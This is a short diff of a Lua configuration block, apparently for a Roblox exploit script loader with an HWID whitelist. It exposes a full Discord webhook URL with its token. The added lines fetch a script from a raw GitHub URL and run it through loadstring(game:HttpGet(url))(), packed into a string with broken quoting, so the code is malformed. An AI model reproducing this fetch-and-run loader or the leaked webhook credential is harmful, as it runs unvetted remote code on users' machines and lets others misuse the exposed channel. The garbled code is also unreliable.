@@ -1,6 +1,7 @@
 -- [[ CONFIGURATION ]]
 local DiscordWebhook = "https://discord.com/api/webhooks/1453677798810980436/AxgxKuR-xeApUxs5DvpjCNVQu2bRGTQfM2_pIkprCbC4324husLv2KTXzFaMsh4fXInM"
-local MainScriptURL = "https://pandadevelopment.net/virtual/file/012b551ebc5c9cce"
+local MainScriptURL = "local url = "https://raw.githubusercontent.com/histo1/Safe/main/Tha%20bronx%20typa%20script"
+loadstring(game:HttpGet(url))()"
 
 -- [[ HWID WHITELIST ]]
 -- Only these people can even open the UI.
